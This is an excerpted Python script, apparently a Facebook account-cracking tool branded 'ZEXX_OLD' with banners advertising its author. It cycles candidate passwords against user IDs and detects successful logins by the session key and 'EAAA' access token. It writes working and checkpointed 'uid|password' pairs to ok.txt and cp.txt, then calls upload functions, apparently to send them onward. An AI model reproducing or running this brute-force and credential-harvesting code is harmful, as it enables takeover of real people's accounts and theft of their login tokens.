...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/farhanmallik51/Old-0.2/blob/main/Old-0.2.txt"])
	exit(" [*] FACEBOOK :  Farhan Mallik ")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER🌼F4RH4N")
	subprocess.check_output(["am", "start", "https://wa.me/qr/L42646UGX4GEC1"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/farhanmallik51/Old-0.2/blob/main/Old-0.2.txt').text
			if basesplit in plr:
				key = basesplit
...
╚══════╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝           
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : Farhan Mallik 
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUP : H.T.B
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : farhanmallik51
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWhatsapp  : 016******32
\033[1;90m══════════════════════════════════════════════════
    """)
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [ZEXX_OLD] : %s/%s -> \033[0;92m [ ZEXX-OK:%s ]- \033[0;91m[ZEXX-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [FARHAN-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[FARHAN-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [FARHAN-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
